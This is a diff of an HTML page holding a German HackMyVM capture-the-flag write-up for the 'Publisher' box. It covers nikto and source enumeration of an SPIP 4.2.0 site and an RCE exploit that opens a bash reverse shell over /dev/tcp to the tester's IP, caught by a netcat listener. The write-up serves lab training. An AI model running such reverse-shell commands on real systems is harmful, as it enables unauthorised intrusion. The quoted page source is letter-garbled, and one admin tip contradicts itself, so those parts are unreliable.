@@ -9,7 +9,7 @@
     <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
 </head>
  <body>
-  <div class="header-bg">
+ <div class="header-bg">
         <h1>Publisher - HackMyVM - Level: Easy - Bericht</h1>
         <div class="level-container level-easy">
             <h2>Easy</h2>
@@ -175,8 +175,9 @@ H RTT     ADDRESS
                 </div>
             </div>
         </section>
-
-              <section id="web-enumeration">
+		
+		
+		        <section id="web-enumeration">
             <h2>Web Enumeration</h2>
             <p class="comment">
                 <strong>Analyse:</strong> Nach dem Portscan konzentriere ich mich auf den Apache-Webserver auf Port 80. Ich verwende das Tool `nikto -h http://publisher.hmv`, um bekannte Webserver-Schwachstellen und Konfigurationsprobleme zu scannen. Der Schalter `-C all` wird hier zwar in der Ausgabe nicht gezeigt, wäre aber nützlich, um alle CGI-Verzeichnisse zu prüfen. Nikto findet mehrere interessante Punkte: Es fehlen wichtige Sicherheits-Header (`X-Frame-Options`, `X-Content-Type-Options`). Es gibt einen Hinweis auf `wp-config.php`, was auf eine WordPress-Installation hindeuten könnte, aber der Site-Titel aus Nmap sprach von SPIP. Die Angabe einer internen IP-Adresse (`172.17.0.2`) in einem `Location`-Header für `/images` ist ein Informationsleck (CVE-2000-0649). ETags könnten Inode-Nummern preisgeben (CVE-2003-1418). Der Apache-Server (2.4.41) ist veraltet. Die erlaubten HTTP-Methoden (`GET, POST, OPTIONS, HEAD`) sind Standard. Und kritisch: Es gibt eine Verzeichnisauflistung (`Directory indexing`) für `/images/`.
@@ -267,18 +268,16 @@ H RTT     ADDRESS
             <p class="comment">
                 <strong>Analyse:</strong> Ich betrachte den Quellcode der Seite `view-source:http://publisher.hmv/spip/index.php`. Das ist eine nützliche Funktion von Browsern, um den gerenderten HTML-Quellcode zu sehen. Hier finde ich zwei sehr interessante Stellen:
                 1.  Eine Formular (`form`) mit der Methode `post` und einer `action`, die auf eine **interne IP-Adresse** verweist: `http://192.168.152.130:8000`. Dies ist ein schwerwiegendes Informationsleck, das auf interne Netzwerkstrukturen hindeutet.
-                2.  HTML-Kommentare, die die Version des CMS preisgeben: `meta name="generator" content="SPIP 4.2.0"`. Diese Kommentare listen auch CSS- und JS-Dateien auf, was die Struktur des SPIP-Templates zeigt. Die SPIP-CRON-Skripte, die per `<script>` oder `<noscript>` eine URL (`http://publisher.hmv/spip/spip.php?action=cron`) aufrufen, sind ebenfalls im Quellcode sichtbar.
+                2.  HTML-Kommentare, die die Version des CMS preisgeben: `meta name="generator" content="SPIP 4.2.0"`. Diese Kommentare listen auch CSS- und JS-Dateien auf, was die Struktur des SPIP-Templates zeigt. Die SPIP-CRON-Skripte, die per   eine URL (`http://publisher.hmv/spip/spip.php?action=cron`) aufrufen, sind ebenfalls im Quellcode sichtbar.
                 <br><strong>Bewertung:</strong> Die Entdeckung der SPIP-Version (4.2.0) ist entscheidend. SPIP ist ein spezifisches Ziel-CMS, für das es oft öffentlich bekannte Schwachstellen gibt. Die interne IP-Adresse ist ebenfalls ein kritisches Informationsleck; auch wenn sie nicht direkt ausgenutzt werden kann, gibt sie Hinweise auf die interne Netzwerkarchitektur.
                 <br><strong>Empfehlung (Pentester):</strong> Analysiere immer den Quellcode von Webseiten auf Kommentare, versteckte Formulare, interne IP-Adressen oder andere Hinweise. Identifiziere das verwendete CMS und seine Version.
                 <br><strong>Empfehlung (Admin):</strong> Entfernen Sie niemals interne IP-Adressen oder interne Netzwerkdetails aus öffentlich zugänglichem HTML-Quellcode. Verhindern Sie, dass CMS-Software ihre genaue Version in Meta-Tags oder Kommentaren preisgibt. Deaktivieren Sie HTML-Kommentare in Produktionsumgebungen, wenn diese potenziell sensible Informationen enthalten könnten.
             </p>
-             <div class="code-block">
-                 <!-- Beachte: <a> Tags und <form>, <button>, <script>, </script>, <?php, ?> etc. werden entfernt, andere HTML-Zeichen maskiert. -->
-                <div class="terminal">
+            
                      <pre>
-class='utin_actin_st ' methd='st' actin='http://<span class="command">192.168.152.130:8000</span>'> </div> submit >Startseite<
+ 
 
-<!-- cmact [
+  [
 	sqelettes-ist/css/reset.css?1703099120
 	sqelettes-ist/css/clear.css?1703099120
 	sqelettes-ist/css/fnt.css?1703099120
@@ -308,8 +307,7 @@ class='utin_actin_st ' methd='st' actin='http://<span class="command">192.168.15
 	lugins-ist/rte_lme/javascrit/jery.revisu_si.js?1703099118
 	lcal/cache-js/jsn-javascrit_rte_lme_start_js-5c9033.js?1749676351
 ] 55.1% -->
-!--.age-->
-<!-- SI-CRN -->< scrpt >setTimeut(fnctin(){var x = new XMLHttReest();x.en('GET', 'htt://ulisher.hmv/si/si.h?actin=crn', tre);x.sen('');},100);< /scrpt ><nsit><div style="ackgrn-image: rl('htt://ulisher.hmv/si/si.h?actin=crn');"></iv></nsit></y>
+ < scrpt >setTimeut(fnctin(){var x = new XMLHttReest();x.en('GET', 'htt://ulisher.hmv/si/si.h?actin=crn', tre);x.sen('');},100);< /scrpt ><nsit><div style="ackgrn-image: rl('htt://ulisher.hmv/si/si.h?actin=crn');"></iv></nsit></y>
 <
 </pre>
                 </div>
@@ -734,9 +732,8 @@ Cie t: <span class="command">/rt/Hackingtls/si-rce-exit/51536.y</span>
                 </div>
             </div>
         </section>
-
-
-              <p class="comment">
+		
+		            <p class="comment">
                 <strong>Analyse:</strong> Nachdem ich die Ausnutzbarkeit der RCE-Schwachstelle mit dem `sleep`-Befehl bestätigt habe, ist der nächste Schritt, eine interaktive Shell auf dem Zielsystem zu erlangen. Ich verwende erneut das Exploit-Skript (hier `spk.py`) mit der SPIP-URL (`-u http://publisher.hmv/spip`), aber diesmal mit einem Befehl, der eine Reverse Shell zu meinem Angreifersystem initiiert (`-c 'bash -c "bash -i >& /dev/tcp/192.168.2.199/1234 0>&1"'`). Dieser Befehl startet eine `/bin/bash`-Shell auf dem Zielsystem, leitet deren Standard-Input, -Output und -Error an eine TCP-Verbindung zu meiner IP-Adresse (`192.168.2.199`) auf Port `1234` um. Parallel dazu habe ich auf meinem Angreifersystem einen Netcat-Listener auf Port `1234` gestartet (`nc -lvnp 1234`), um die eingehende Verbindung abzufangen.
                 Die Ausgabe des Netcat-Listeners zeigt, dass er auf Port `1234` lauscht (`listening on [any] 1234 ...`) und dann erfolgreich eine Verbindung vom Zielsystem (`connect to [192.168.2.199] from (UNKNOWN) [192.168.2.38] 58178`) empfängt. Nach der Verbindung erhalte ich eine Bash-Shell, identifizierbar an der Eingabeaufforderung `www-data@41c976e507f8:/home/think/spip/spip$`. Die Meldungen "bash: cannot set terminal process group" und "bash: no job control in this shell" sind typische Hinweise darauf, dass es sich um eine einfache, nicht voll interaktive Shell handelt, aber sie ist voll funktionsfähig für die Befehlsausführung.
                 <br><strong>Bewertung:</strong> Fantastisch! Die RCE-Schwachstelle konnte erfolgreich ausgenutzt werden, um eine Reverse Shell als Benutzer `www-data` zu erlangen. `www-data` ist der Standardbenutzer, unter dem der Apache-Webserver und damit auch das SPIP-CMS laufen. Dies markiert den Initial Access auf das System. Obwohl ich noch keine Root-Rechte habe, kann ich nun lokale Befehle ausführen, das Dateisystem enumerieren und nach Wegen zur Privilegien-Eskalation suchen. Die alternative Methode, den Admin-Passwort zu knacken (falls erfolgreich), hätte mir wahrscheinlich Zugriff auf das SPIP-Backend gegeben, aber nicht direkt eine System-Shell. Die RCE war hier der schnellere und direktere Weg.
@@ -1234,6 +1231,7 @@ think@ulisher:~$
         <p>Ben - Cyber Security Reports</p>
         <p>Berichtsdatum: 11. Juni 2025</p>
     </footer>
+
  
 
 
